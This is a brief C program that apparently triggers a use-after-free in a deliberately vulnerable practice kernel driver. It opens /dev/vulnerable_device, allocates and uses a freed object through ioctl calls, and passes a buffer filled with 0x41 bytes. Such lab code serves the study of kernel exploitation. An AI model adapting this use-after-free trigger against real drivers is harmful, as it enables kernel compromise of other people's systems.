#include <string.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <stdio.h>

#include "vuln_driver.h"

#define PATH "/dev/vulnerable_device"

typedef struct k_object
{
	char buff[256];
}k_object;

int main(void)
{
	int fd = open(PATH, O_RDWR);
	char *buff = "hello";

	k_object *obj = malloc(sizeof(k_object));
	memset(obj->buff, 0x41, sizeof(obj->buff));

	ioctl(fd, DRIVER_TEST);
	ioctl(fd, ALLOC_UAF_OBJ, NULL);
	ioctl(fd, USE_UAF_OBJ, NULL);
	ioctl(fd, ALLOC_K_OBJ, obj);
}
